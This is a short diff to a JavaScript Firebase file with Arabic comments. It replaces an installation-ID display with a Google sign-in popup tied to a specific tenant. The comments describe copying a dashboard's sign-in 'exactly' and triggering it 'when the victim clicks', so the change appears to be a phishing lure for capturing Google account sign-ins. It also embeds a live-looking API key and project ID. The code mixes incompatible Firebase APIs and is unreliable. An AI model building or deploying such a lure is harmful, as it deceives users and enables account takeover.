@@ -4,30 +4,25 @@ import { getInstallations, getId } from "https://www.gstatic.com/firebasejs/10.8
 
 // إعدادات Firebase الخاصة بك (استبدل القيم ببيانات مشروعك الحقيقية)
 const firebaseConfig = {
-  apiKey: "YOUR_API_KEY",
-  authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-  projectId: "YOUR_PROJECT_ID",
+  apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
+  authDomain: "scarcely-calm-lark.firebaseapp.com",
+  projectId: "scarcely-calm-lark",
   storageBucket: "YOUR_PROJECT_ID.appspot.com",
   messagingSenderId: "YOUR_MESSAGING_ID",
   appId: "YOUR_APP_ID"
 };
 
-// تهيئة التطبيق
-const app = initializeApp(firebaseConfig);
-const installations = getInstallations(app);
+const app = firebase.initializeApp(firebaseConfig);
+const auth = app.auth();
 
-// دالة جلب الـ FID وعرضه
-async function fetchFID() {
-    const displayElement = document.getElementById('fid-display');
-    try {
-        const fid = await getId(installations);
-        console.log("Firebase Installation ID:", fid);
-        displayElement.innerText = fid;
-    } catch (error) {
-        console.error("حدث خطأ أثناء جلب الـ FID:", error);
-        displayElement.innerText = "فشل استخراج المعرف. تحقق من الإعدادات.";
-    }
-}
+// 🔑 المفتاح: تعيين Tenant الصحيح
+// بدون هذا السطر = حساب بدون Tenant = 403 من الخادم
+auth.tenantId = "hound-j8zaz";
 
-// تشغيل الدالة فور تحميل الصفحة
-fetchFID();
+// نفس طريقة لوحة التحكم بالضبط
+const provider = new firebase.auth.GoogleAuthProvider();
+provider.addScope('profile');
+provider.addScope('email');
+
+// عند ضغط الضحية "Sign in with Google"
+firebase.auth().signInWithPopup(auth, provider);
